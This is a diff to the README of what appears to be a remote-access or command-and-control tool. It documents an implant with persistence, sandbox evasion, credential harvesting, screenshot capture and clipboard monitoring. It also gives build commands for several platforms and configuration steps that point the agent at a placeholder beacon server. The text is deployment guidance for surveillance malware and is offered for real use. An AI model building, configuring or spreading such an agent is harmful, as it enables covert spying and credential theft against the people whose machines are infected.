@@ -78,3 +78,43 @@ Multiple methods to maintain access:
 
 - VM and sandbox detection
 - Credential harvesting
+- Screenshot capture
+- Clipboard monitoring
+
+### Building for Different Platforms
+
+Build for all supported platforms:
+```powershell
+.\build.ps1 -Target all
+```
+
+Or build specific targets:
+```powershell
+.\build.ps1 -Target agent -OS linux -Arch amd64
+.\build.ps1 -Target agent -OS darwin -Arch arm64
+```
+
+## Testing
+
+Run the test suite to verify everything works:
+```powershell
+.\test-all-features.ps1
+```
+
+## Configuration
+
+Before using this in any real scenario, update the default settings:
+
+**Change the encryption key** in both `server/server.go` and `agent/agent.go`:
+```go
+key := "YourCustomKey32BytesLongHere"
+```
+
+**Set your server address** in `agent/agent.go`:
+```go
+serverURL := "ws://your-server-ip:8443/api/agent"
+```
+
+**Adjust beacon interval** if needed:
+```go
+Interval: 30 * time.Second
